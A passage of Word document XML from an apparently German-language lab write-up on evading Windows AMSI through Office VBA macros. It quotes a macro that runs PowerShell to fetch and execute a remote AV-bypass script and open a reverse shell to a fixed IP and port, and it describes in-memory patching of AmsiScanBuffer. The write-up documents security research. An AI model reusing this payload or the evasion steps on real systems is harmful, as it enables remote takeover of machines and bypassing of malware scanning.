    <w:p w14:paraId="5DC98AF9" w14:textId="17E55A03" w:rsidR="003F3C95" w:rsidRDefault="003F3C95">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54BAD99D" w14:textId="22F9C66C" w:rsidR="003F3C95" w:rsidRDefault="003F3C95">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="101130FE" wp14:editId="064012B1">
            <wp:extent cx="3364173" cy="1570428"/>
            <wp:effectExtent l="0" t="0" r="8255" b="0"/>
            <wp:docPr id="126" name="Grafik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388939" cy="1581989"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="633DDD72" w14:textId="31A14121" w:rsidR="003F3C95" w:rsidRDefault="003F3C95" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="124C5E57" w14:textId="726BBD6B" w:rsidR="0084189E" w:rsidRDefault="0084189E" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Na gut, dachte ich mir, übergibts du den Befehl </w:t>
      </w:r>
      <w:r w:rsidR="00F876A4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">halt innerhalb </w:t>
      </w:r>
      <w:r w:rsidR="00630E06">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>der</w:t>
      </w:r>
      <w:r w:rsidR="00F876A4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> VBA </w:t>
      </w:r>
      <w:r w:rsidR="00630E06">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Funktion und dann wird das schon funktionieren… </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CAD60B1" w14:textId="1CF21A66" w:rsidR="00041F9C" w:rsidRDefault="00041F9C" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00355DAA" w:rsidRPr="00866A18" w14:paraId="21A11980" w14:textId="77777777" w:rsidTr="00355DAA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="216F3334" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008713D7">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Sub Test()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="420C218A" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5FC8B091" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008713D7">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim ws As Object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4949D52F" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="308439DA" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008713D7">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>cmd1 = "powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1');Invoke-AlokS-AvBypass;$client = New-Object System.Net.Sockets.TCPClient('10.0.2.11',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BAC2880" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="769A9B33" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008713D7">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Set ws = CreateObject("WScript.Shell")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2440F887" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008713D7">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>ws.Exec (cmd1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B8B1667" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="51E75292" w14:textId="77777777" w:rsidR="008713D7" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="52BFC2CD" w14:textId="32578D45" w:rsidR="00355DAA" w:rsidRPr="008713D7" w:rsidRDefault="008713D7" w:rsidP="008713D7">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008713D7">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EEB8C35" w14:textId="6FDA89B9" w:rsidR="00355DAA" w:rsidRDefault="00355DAA" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DE266CF" w14:textId="21E24ED0" w:rsidR="00C4499E" w:rsidRPr="0010749B" w:rsidRDefault="005A195B" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66BED">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das funktionierte </w:t>
      </w:r>
      <w:r w:rsidR="00F66BED" w:rsidRPr="00F66BED">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>soweit ohne P</w:t>
      </w:r>
      <w:r w:rsidR="00F66BED">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>robleme, sobald ich d</w:t>
      </w:r>
      <w:r w:rsidR="0088546B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>en Antivirus anwarf meldete sich jedoch wieder AMSI und sagte mir, da</w:t>
      </w:r>
      <w:r w:rsidR="00484474">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ss eine Bedrohung gefunden wurde.</w:t>
      </w:r>
      <w:r w:rsidR="00214809">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Was ich hierbei vermute ist, dass AMSI bereits </w:t>
      </w:r>
      <w:r w:rsidR="0010749B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">beim Aufruf von </w:t>
      </w:r>
      <w:r w:rsidR="0010749B" w:rsidRPr="0010749B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>WScript</w:t>
      </w:r>
      <w:r w:rsidR="0010749B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ansp</w:t>
      </w:r>
      <w:r w:rsidR="00BA4496">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ringt und der Bypass somit nicht vorgenommen werden kann, weil AMSI schon davor blockiert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223B76E1" w14:textId="5E4C5ABF" w:rsidR="00484474" w:rsidRDefault="00484474" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32423664" w14:textId="7987FA73" w:rsidR="00484474" w:rsidRDefault="00484474" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="195CA3C8" wp14:editId="1203E2D6">
            <wp:extent cx="3381375" cy="1543050"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="132" name="Grafik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381375" cy="1543050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="43477A75" w14:textId="19EEE172" w:rsidR="005A195B" w:rsidRDefault="005A195B" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BE14349" w14:textId="77777777" w:rsidR="00146436" w:rsidRDefault="004156C5" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Schade, wäre zu einfach gewesen.</w:t>
      </w:r>
      <w:r w:rsidR="00550523">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Also </w:t>
      </w:r>
      <w:r w:rsidR="00BA4496">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>suchte ich weiter.</w:t>
      </w:r>
      <w:r w:rsidR="00BA7FF1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ich fand ein sehr interessantes Github Repository, was </w:t>
      </w:r>
      <w:r w:rsidR="00CD7722">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">unterschiedliche Methoden aufzeigt, um mit Powershell </w:t>
      </w:r>
      <w:r w:rsidR="00385537">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>AMSI zu umgehen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E652641" w14:textId="597933C6" w:rsidR="00146436" w:rsidRDefault="00146436" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19C41A8F" w14:textId="76EB3D67" w:rsidR="00146436" w:rsidRPr="00146436" w:rsidRDefault="00DE67E4" w:rsidP="00146436">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId30" w:anchor="Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse" w:history="1">
        <w:r w:rsidR="00146436" w:rsidRPr="00146436">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4140CA6D" w14:textId="77777777" w:rsidR="00146436" w:rsidRDefault="00146436" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C4B8D9B" w14:textId="5C286B72" w:rsidR="00A660F2" w:rsidRDefault="00385537" w:rsidP="006038E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Hierbei habe ich aber denke ich wieder das gleiche Problem </w:t>
      </w:r>
      <w:r w:rsidR="00113B94">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wie vorhe</w:t>
      </w:r>
      <w:r w:rsidR="004A4892">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r.</w:t>
      </w:r>
      <w:r w:rsidR="00D46069">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Es handelt sich um PowerShell Befehle und ich schätze, dass ich gar nicht so weit komme den Code überhaupt ausführen zu können.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F520ED5" w14:textId="5A0FC962" w:rsidR="007D4360" w:rsidRDefault="007D4360" w:rsidP="006038E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AADA3CC" w14:textId="2AB9087A" w:rsidR="007D4360" w:rsidRPr="00F66BED" w:rsidRDefault="00BD0FC3" w:rsidP="006038E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nach einer Zeit bin ich auf folgenden Blog </w:t>
      </w:r>
      <w:r w:rsidR="00D626EF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Eintrag gestoßen, der einen </w:t>
      </w:r>
      <w:r w:rsidR="00347F85">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">AMSI In </w:t>
      </w:r>
      <w:r w:rsidR="00D626EF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Memory Bypass </w:t>
      </w:r>
      <w:r w:rsidR="00347F85">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mithilfe von VBA beschreibt. </w:t>
      </w:r>
      <w:r w:rsidR="00214845">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dieser beschreibt, dass AMS in </w:t>
      </w:r>
      <w:r w:rsidR="00214845" w:rsidRPr="00214845">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>den meisten Fällen in der PowerShell durch einfache Verschleierung umgangen werden</w:t>
      </w:r>
      <w:r w:rsidR="009843D9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> kann</w:t>
      </w:r>
      <w:r w:rsidR="00214845" w:rsidRPr="00214845">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>. AMSI innerhalb von VBA ist jedoch sehr unterschiedlich</w:t>
      </w:r>
      <w:r w:rsidR="005560EF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> zu den gewährten Möglichkeiten in PowerShell</w:t>
      </w:r>
      <w:r w:rsidR="00214845" w:rsidRPr="00214845">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00214845">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#a8b06a2a-5800-4f46-86dc-628f76bc0469"/>
          <w:id w:val="-1512140788"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00214845">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="00214845">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="000E27AC">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[5]</w:t>
          </w:r>
          <w:r w:rsidR="00214845">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
    </w:p>
    <w:p w14:paraId="37552E50" w14:textId="2BC2DFAA" w:rsidR="00214845" w:rsidRDefault="00214845" w:rsidP="006038E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48F2F58C" w14:textId="3B80CD60" w:rsidR="00214845" w:rsidRPr="00417A42" w:rsidRDefault="00214845" w:rsidP="006038E7">
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Da ich dies </w:t>
      </w:r>
      <w:r w:rsidR="0079680E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>auch feststellen musste wurde ich schonmal neugierig.</w:t>
      </w:r>
      <w:r w:rsidR="008E00F7">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001500E2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Bypass von AMSI wir mittels eines in memory patches durchgeführt. Dabei </w:t>
      </w:r>
      <w:r w:rsidR="00024EC1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wird </w:t>
      </w:r>
      <w:r w:rsidR="008F66B9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Adresse</w:t>
      </w:r>
      <w:r w:rsidR="00024EC1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00024EC1" w:rsidRPr="00024EC1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>AmsiScanBuffer</w:t>
      </w:r>
      <w:r w:rsidR="00024EC1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ermittelt </w:t>
      </w:r>
      <w:r w:rsidR="00EA55CC">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">und anschließend mit der Funktion </w:t>
      </w:r>
      <w:r w:rsidR="00550684" w:rsidRPr="00550684">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>RtlFillMemory</w:t>
      </w:r>
      <w:r w:rsidR="00550684">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0076795E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">das memory patching vorgenommen. </w:t>
      </w:r>
      <w:r w:rsidR="00F551B4" w:rsidRPr="00F551B4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>RtlFillMemory</w:t>
      </w:r>
      <w:r w:rsidR="001314F2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ist eine Routine, welche </w:t>
      </w:r>
      <w:r w:rsidR="002F4DA3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">einen Block im Speicher mit spezifizierten Werten füllt </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#0261b217-fe07-4f32-81da-fb526671e7c1"/>
          <w:id w:val="1413199505"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[6]</w:t>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="002F4DA3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00597C53">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die Routine wird in der Funktion </w:t>
      </w:r>
      <w:r w:rsidR="00597C53" w:rsidRPr="00597C53">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ByteSwappe</w:t>
      </w:r>
      <w:r w:rsidR="007614F3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r aufgerufen.</w:t>
      </w:r>
      <w:r w:rsidR="00597C53">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DF285C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um </w:t>
      </w:r>
      <w:r w:rsidR="00650585">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>einen Bypass für 32 und 64 bit Betriebssystem vorzunehmen</w:t>
      </w:r>
      <w:r w:rsidR="006C0A0C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wird in der Funktion </w:t>
      </w:r>
      <w:r w:rsidR="006C0A0C" w:rsidRPr="006C0A0C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>TestOfficeVersion</w:t>
      </w:r>
      <w:r w:rsidR="006C0A0C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> überprüft, um welche Version von Windows es sich handelt.</w:t>
      </w:r>
      <w:r w:rsidR="00951F14">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die </w:t>
      </w:r>
      <w:r w:rsidR="004A28D3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Schreiber des Beitrags entdeckten während ihrer Tätigkeit, dass </w:t>
      </w:r>
      <w:r w:rsidR="004A28D3" w:rsidRPr="004A28D3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>RtlCopyMemory</w:t>
      </w:r>
      <w:r w:rsidR="004A28D3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> nur auf 64 bit Betriebssystemen verfügbar war und </w:t>
      </w:r>
      <w:r w:rsidR="00857322" w:rsidRPr="00857322">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">RtlCopyMemory </w:t>
      </w:r>
      <w:r w:rsidR="00857322">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>und</w:t>
      </w:r>
      <w:r w:rsidR="00857322" w:rsidRPr="00857322">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> RtlMoveMemory </w:t>
      </w:r>
      <w:r w:rsidR="00BB24E8">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Aliase</w:t>
      </w:r>
      <w:r w:rsidR="00857322">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> für die Funktion memcpy sind.</w:t>
      </w:r>
      <w:r w:rsidR="00F163AF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Um die </w:t>
      </w:r>
      <w:r w:rsidR="00E4083F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Adresse von </w:t>
      </w:r>
      <w:r w:rsidR="00E4083F" w:rsidRPr="00E4083F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>AmsiScanString</w:t>
      </w:r>
      <w:r w:rsidR="00E4083F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> zu ermitteln </w:t>
      </w:r>
      <w:r w:rsidR="009F454C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wird zuerst die Adresse von </w:t>
      </w:r>
      <w:r w:rsidR="009F454C" w:rsidRPr="009F454C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>AmsiUacInitialize</w:t>
      </w:r>
      <w:r w:rsidR="009F454C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ermittelt und dann 80</w:t>
      </w:r>
      <w:r w:rsidR="00CF65C4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
